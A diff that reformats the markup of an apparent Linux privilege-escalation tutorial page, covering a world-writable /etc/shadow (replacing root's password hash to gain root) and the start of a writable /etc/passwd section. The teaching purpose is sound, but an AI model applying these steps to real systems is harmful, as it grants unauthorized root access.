@@ -128,26 +128,26 @@ root</code></pre>
 		</div>
             </section>
 
-	   <section id="Three">
+	    <section id="Three">
 		<div class="section-header">Writable /etc/shadow</div>
-	   	<div class="section-content">
+		<div class="section-content">
 			<p>This technique is similar to the last. The "/etc/shadow" file should only be writable by root. In our case, we can see that it is writable by absolutely anyone, bad idea!</p>
-	                <pre><code>user@debian:~$ ls -l /etc/shadow
-	-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
-	                <p>In this instance we can simply replace the root user's hash with our own hash. First, create the hash:</p>
-	                <pre><code>user@debian:~$ mkpasswd -m sha-512 naughty123
-	$6$eR5nW1fZ63CE6Fy/$6g1I55XBX1ObH88mPxMI1CntZEq2mbT3BeJXkafhdjtKS.CZ2Krktglc0xOq60ByeK01ZzqMpj4Fz/H6PHlWH0</code></pre>
-	                <p>Replace the root user's hash with your own and switch to root:</p>
-	                <pre><code>user@debian:~$ su root
-	Password:
-	root@debian/home/user# whoami
-	root</code></pre>
-	                <p><strong>Congratulations, you own the system!</strong></p>
+			<pre><code>user@debian:~$ ls -l /etc/shadow
+-rw-r--rw- 1 root shadow 837 Aug 25 2019 /etc/shadow</code></pre>
+			<p>In this instance we can simply replace the root user's hash with our own hash. First, create the hash:</p>
+			<pre><code>user@debian:~$ mkpasswd -m sha-512 naughty123
+$6$eR5nW1fZ63CE6Fy/$6g1I55XBX1ObH88mPxMI1CntZEq2mbT3BeJXkafhdjtKS.CZ2Krktglc0xOq60ByeK01ZzqMpj4Fz/H6PHlWH0</code></pre>
+			<p>Replace the root user's hash with your own and switch to root:</p>
+			<pre><code>user@debian:~$ su root
+Password:
+root@debian/home/user# whoami
+root</code></pre>
+			<p><strong>Congratulations, you own the system!</strong></p>
 		</div>
-	   </section>
+	    </section>
 		
             <section id="Four">
-                <h2>Writeable /etc/passwd</h2>
+                <div class="section-header">Writeable /etc/passwd</div>
                 <p>Again, a very similar techinque to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>
                 <pre><code>user@debian:~$ ls -l /etc/passwd
 -rw-r--rw- 1 root root 1009 Aug 25 2019 /etc/passwd</code></pre>
